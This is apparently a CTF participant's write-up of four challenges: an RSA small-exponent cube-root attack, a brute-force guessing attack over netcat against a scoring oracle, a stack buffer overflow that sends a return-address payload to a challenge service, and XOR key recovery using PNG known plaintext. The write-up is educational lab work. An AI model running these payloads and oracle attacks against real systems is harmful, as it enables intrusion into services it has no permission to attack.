I used terminal and pry for all the challenges.
Below is a cleaned up version without dead ends, off by one errors etc.

## Bigger Is Better

This one was the easiest of them all. In fact it was so easy that I first tried some fancier attacks before just going for this.

RSA uses this formula for encryption:

    c = p ** e % n

But for very large n that modulo does nothing, and this turns into simply:

    c = p ** e

So I loaded helpful snippets from https://github.com/taw/ctf-tools and did

    c.root(e).to_s_binary

Which gave the answer.

## Green Eggs and Ham #1

Connecting to the port and experimenting suggested that score will be lower if guess matches the flag better.

And it suggested the answer is in form "flag{something long}"

I ran this shell one liner to guess one character at a time:

    $ ruby -e 'px="flag{I_d0_s0_"; (32..127).map(&:chr).each{|x| puts(px+x)}' | nc 167.99.82.112 45678 | grep score: | ruby -nle 'STDIN.readlines.zip(33..127).each{|l,c| puts "#{l[/\d+/]} #{c.chr}"}' | sort -n | head -n2

Just expanding prefix to best match.

I thought about writing proper program for it, but creating new connection per guess was very slow, so this kind of batching was quite effective.

## My First Buffer Overflow

I copied the file to Linux machine.

First I made sure it segfaults when exposed to very long input. Since that worked I loaded it in gdb (just for better error message), and tried alphabetical messages to see which characters overwrite stack:

    $ gdb my_first_buffer_overflow_redacted
    Reading symbols from my_first_buffer_overflow_redacted...(no debugging symbols found)...done.
    (gdb) r
    Starting program: /root/my_first_buffer_overflow_redacted
    1: What's a buffer overflow?
    2: Overwriting a return address
    3: Identifying offsets
    4: Getting the fake flag
    5: Getting the flag
    6: Exit
    Your choice: ABCDABCDABABCDABCDABABCDABCDABABCDABCDAB0123456789abcdefghijkl

    Program received signal SIGSEGV, Segmentation fault.
    0x6a696867 in ?? ()

With that knowledge I did:

    $ objdump -d my_first_buffer_overflow_redacted

to find address of flag printing function (some extra padding and head/echo for cleaner output):

    $ ruby -e 'print "ABCDABCDABABCDABCDABABCDABCDABABCDABCDAB0123456789abcdef" + [0x080486d5].pack("l"); print "xxxxxxxxx\n6\n"' | ./my_first_buffer_overflow_redacted | head ; echo

Since it worked I tried that on the service to get the flag

    $ ruby -e 'print "ABCDABCDABABCDABCDABABCDABCDABABCDABCDAB0123456789abcdef" + [0x080486d5].pack("l"); print "xxxxxxxxx\n6\n"' | nc 167.99.82.112 30000

## Fuzzy Image

The hint was very helpful:

    HINT: The key is the concatenation of three lowercase English words.

I downloaded random png from the internet, and xored its first bytes with encrypted image:

    ct = open("ekfwnq-omf", "rb").read.unpack("C*")
    pt = open("sample.png", "rb").read.unpack("C*")[0,50]
    ct[0,50].zip(pt).map{|u,v| (u^v).chr}.join
    # => "dialoguecomprehenshVecn\xF5struc+aXElogwtja}x\x85m\x9F\x19\x99\xB7\\\xD1"

This suggested that words are "dialog", "comprehen*", "*stru*". Having "log" at positions 3 and 33 was a decent guess that total length of concatenated words is 30 characters.

Optionally, to double check that, length of the key can be confirmed by checking end of file header (last 4 bytes are checksum, so unknown):

    ct[-8..-1].zip("IENDxxxx".unpack("C*")).map{|u,v| (u^v)}.map(&:chr).join
    # => "stru\xB5N|\x93"

Checking offsets, 30 was the only possible key length, and "stru" is in the key at possition 24.

It's probably possible to do some statistical analysis to get the whole thing, but at this point I just used my dictionary to generate a bunch of keys.

    $ cat </usr/share/dict/words | grep '^comprehen' | ruby -nle 'open("/usr/share/dict/words").readlines.map(&:chomp).each{|x| u="dialogue"+$_+x; puts u if u.size == 30 and u.index("stru") == 24}' > keys

And then wrote down all 79 possible files:

    maybekeys = open("keys").readlines.map(&:chomp)
    maybekeys.each{|key| dec = ct.zip(key.unpack("C*") * 100000).map{|u,v| (u^v)}.pack("C*"); open("xxx-#{key}.png", "w").write(dec) }

If that didn't work, I could have gone back and expanded the regexp, but one of the files was valid PNG, so I read the flag on it.
